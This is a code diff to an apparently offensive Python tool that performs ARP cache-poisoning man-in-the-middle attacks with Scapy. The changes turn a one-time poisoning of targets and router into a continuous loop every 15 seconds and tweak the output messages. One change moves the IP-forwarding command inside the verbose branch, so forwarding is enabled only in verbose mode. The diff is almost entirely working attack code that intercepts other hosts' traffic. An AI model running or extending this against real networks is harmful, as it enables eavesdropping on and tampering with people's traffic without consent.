@@ -29,7 +29,7 @@ from scapy.all import *
 from netscanner import netscan_main
 
 # Define text colours
-B, R, Y, G, M, N = '\33[94m', '\033[91m', '\33[93m', '\033[1;32m', '\033[1;35m', '\033[0m'
+B, R, Y, G, N = '\033[1;34m', '\033[1;31m', '\033[1;33m', '\033[1;32m', '\033[1;37m'
 
 # Define the class
 class arp_mitm:
@@ -54,7 +54,7 @@ class arp_mitm:
         self.tgt_list = netscan_main.netscanner(1, self.target, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1, verbose=self.verbose).init_scan()
         if self.verbose == 1:
             print("{0}[*] Obtaining Router MAC Address...".format(N))
-        self.rtr_scan = netscan_main.netscanner(1, self.rtrip, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1, verbose=self.verbose).init_scan()
+        self.rtr_scan = netscan_main.netscanner(1, self.rtrip, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1, verbose=0).init_scan()
 
         if not self.tgt_list:
             print("{0}[*] No targets found via ARP scan. Exiting...".format(R))
@@ -90,17 +90,19 @@ class arp_mitm:
     def start_arp_mitm(self):
         if self.verbose == 1:
          print("{0}[*] Starting ARP MITM attack...".format(N))
-         print("{0}[*] Turn on IP Forwarding in {1}...".format(N, self.ipforward_file))
+         print("{0}[*] Turning on IP Forwarding in {1}...".format(N, self.ipforward_file))
+         os.popen("sudo echo '1' > {0}".format(self.ipforward_file))
          print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
-        os.popen("sudo echo '1' > {0}".format(self.ipforward_file))
+         print("{0}[*] NETATAK will poison the target ARP cache every 15 seconds.".format(N))
         try:
-            for i in self.tgt_list:
-                result = self.tgt_list[i].split('-')
-                send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst=result[1]), count=1, verbose=0)
-                send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac), count=1, verbose=0)
-                time.sleep(5)
-                if self.verbose == 1:
-                    print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
+            while True:
+                for i in self.tgt_list:
+                    result = self.tgt_list[i].split('-')
+                    send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst=result[1]), count=1, verbose=0)
+                    send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac), count=1, verbose=0)
+                    time.sleep(15)
+                    if self.verbose == 1:
+                        print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
         except KeyboardInterrupt:
             print("{0}[*] ARP MITM Attack stopped by user.".format(R))
             self.stop_arp_mitm()
@@ -116,7 +118,7 @@ class arp_mitm:
             print("{0}[*]Target %s with MAC address %s restored".format(G) % (result[0], result[1]))
 
         # Turn IP Forwarding Off.
-        print("{0}[*] Turn off IP Forwarding in {1}...".format(N, self.ipforward_file))
+        print("{0}[*] Turning off IP Forwarding in {1}...".format(N, self.ipforward_file))
         os.popen("sudo echo '0' > {0}".format(self.ipforward_file))
 
         print("{0}[*] Targets restored. Exiting...".format(G))
